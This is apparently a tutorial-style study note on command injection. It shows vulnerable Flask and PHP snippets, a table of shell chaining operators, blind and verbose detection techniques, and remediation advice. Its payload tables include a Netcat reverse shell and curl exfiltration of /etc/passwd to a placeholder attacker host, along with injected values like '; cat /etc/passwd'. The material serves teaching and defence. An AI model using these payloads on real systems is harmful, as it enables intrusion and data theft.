# Command Injection

## 🔍 Overview

**Command injection** is a vulnerability that allows an attacker to execute arbitrary operating system commands on the server hosting a web application. It occurs when user-supplied input is passed unsanitised into a system call or shell function.

> **Root cause:** The application passes user input directly to the OS shell — treating data as instructions. The attacker injects shell operators or commands alongside the expected input to run additional commands with the application's privileges.

---

## 🕵️ Discovering Command Injection

Web applications in Python, PHP, and Node.js commonly use functions that make OS-level calls — passing variables derived from user input directly to the shell.

### Python

| Component | Role |
|-----------|------|
| **Flask** | Lightweight web framework used to set up the web server and handle requests |
| **subprocess** | Python package that executes OS commands on the host device |

```python
import subprocess
from flask import Flask, request

app = Flask(__name__)

@app.route('/ping')
def ping():
    host = request.args.get('host')
    result = subprocess.check_output('ping -c 1 ' + host, shell=True)
    return result
```

> `host` is taken directly from user input and concatenated into the shell command. An attacker supplying `127.0.0.1; cat /etc/passwd` executes both commands.

### PHP

```php
<?php
    $file = $_GET['file'];           // User input via GET parameter
    echo shell_exec('grep -r ' . $file . ' /var/www/');
?>
```

> `$file` is taken from the GET request and passed directly to `shell_exec`. Injecting `; whoami` appends a second command.

---

## ⚡ Exploitation

### Shell Operators — Chaining Commands

Shell operators allow multiple commands to be combined in a single input string — the key to command injection.

| Operator | Behaviour | Example |
|----------|-----------|---------|
| `;` | Run first command, then second regardless of outcome | `ping 127.0.0.1; whoami` |
| `&` | Run both commands concurrently | `ping 127.0.0.1 & whoami` |
| `&&` | Run second command only if first succeeds | `ping 127.0.0.1 && whoami` |
| `\|` | Pipe output of first command into second | `cat /etc/passwd \| grep root` |
| `\|\|` | Run second command only if first fails | `invalidcmd \|\| whoami` |
| `` ` `` (backtick) | Command substitution — executes inline | `` ping `whoami` `` |
| `$()` | Command substitution (modern syntax) | `ping $(whoami)` |

---

## 🔬 Detection Methods

### Blind Injection

No output is returned to the screen — the attacker must infer success from application behaviour.

| Technique | Description | Example Payload |
|-----------|-------------|----------------|
| **Time delay** | Inject a command that pauses execution — measure response time | `; sleep 10` / `& ping -c 10 127.0.0.1` |
| **Output redirection** | Write command output to a web-accessible file, then retrieve it | `; whoami > /var/www/html/output.txt` |
| **Out-of-band (curl)** | Send data to an attacker-controlled server — confirms execution without page output | `; curl http://attacker.com/?data=$(whoami)` |

> **Time-based detection:** If the page takes 10 seconds longer to respond after injecting `sleep 10`, the command executed — even with no visible output.

### Verbose Injection

The application directly returns command output — easiest to confirm and exploit.

```
# Inject whoami to see which user the app runs as
?file=test; whoami

# Inject ls to enumerate the directory
?file=test; ls
```

---

## 🛠️ Payloads

### Linux

| Command | Purpose |
|---------|---------|
| `whoami` | Identify the user the application runs as |
| `ls` | List contents of the current directory |
| `cat /etc/passwd` | Read system users file |
| `ping -c 10 127.0.0.1` | Cause a time delay — test blind injection |
| `sleep 10` | Time delay where `ping` is unavailable |
| `nc -e /bin/bash attacker.com 4444` | Spawn a reverse shell via Netcat |
| `curl http://attacker.com/?data=$(cat /etc/passwd)` | Exfiltrate file content out-of-band |

### Windows

| Command | Purpose |
|---------|---------|
| `whoami` | Identify the user the application runs as |
| `dir` | List contents of the current directory |
| `type C:\Windows\win.ini` | Read a system file |
| `ping -n 10 127.0.0.1` | Cause a time delay — test blind injection |
| `timeout 10` | Time delay where `ping` is unavailable |

> **Payload reference list:** [github.com/payload-box/command-injection-payload-list](https://github.com/payload-box/command-injection-payload-list)

---

## 🛡️ Remediation

### Dangerous PHP Functions

These PHP functions execute OS commands and should never receive unsanitised user input:

| Function | Description |
|----------|-------------|
| `exec()` | Executes a command and returns the last line of output |
| `passthru()` | Executes a command and passes raw output directly to the browser |
| `system()` | Executes a command and displays output |
| `shell_exec()` | Executes a command via the shell and returns all output as a string |
| `popen()` | Opens a pipe to a process spawned from a shell command |

> **Best practice:** Avoid these functions entirely where possible. If OS interaction is necessary, use language-level libraries that don't invoke a shell (e.g. Python's `subprocess` with `shell=False` and a list of arguments rather than a string).

### Input Sanitisation

| Method | Description |
|--------|-------------|
| **Strip shell metacharacters** | Remove or reject `;`, `&`, `\|`, `>`, `<`, `` ` ``, `$`, `(`, `)`, `\n` from user input |
| **Allowlist validation** | Define exactly what valid input looks like (e.g. only alphanumeric characters for a hostname) — reject everything else |
| **Parameterised system calls** | Pass arguments as a list rather than a concatenated string — the shell never interprets the input as commands |
| **Least privilege** | Run the web application as a low-privilege user — limits damage if injection succeeds |
| **Disable dangerous functions** | In PHP, use `disable_functions` in `php.ini` to block `exec`, `system`, `passthru`, etc. at the server level |

```python
# ❌ Vulnerable — input concatenated into shell string
subprocess.check_output('ping -c 1 ' + host, shell=True)

# ✅ Safe — input passed as a list, shell=False, no interpretation
subprocess.check_output(['ping', '-c', '1', host], shell=False)
```
